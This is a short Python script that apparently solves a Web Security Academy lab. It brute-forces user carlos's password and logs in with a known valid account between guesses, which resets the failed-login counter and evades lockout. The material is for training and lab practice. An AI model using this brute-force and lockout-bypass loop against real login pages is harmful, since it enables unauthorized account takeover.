from web_security_academy.core.logger import logger
from web_security_academy.core.utils import auth_lab_passwords


def solve_lab(session):
    passwords = auth_lab_passwords()
    logger.success("Success.")

    # Password enumeration
    user = "carlos"
    logger.info(f"Brute-forcing {user}'s password...")
    logger.toggle_newline()
    for i, password in enumerate(passwords):
        if i % 2 == 1:
            # Reset number of failed attempts with valid login
            data = {"username": "wiener", "password": "peter"}
            session.post_path("/login", data=data, allow_redirects=False)

        headers = None
        data = {"username": user, "password": password}
        resp = session.post_path("/login", data=data, allow_redirects=False)

        if resp.status_code != 302:
            logger.info(f"{password} => Incorrect")
        else:
            logger.success(f"{password} => Correct!")
            logger.toggle_newline()
            break
    else:
        logger.failure(f"Unable to brute-force {user}'s password.")
        logger.toggle_newline()
        return

    session.login(user, password, with_csrf=False)
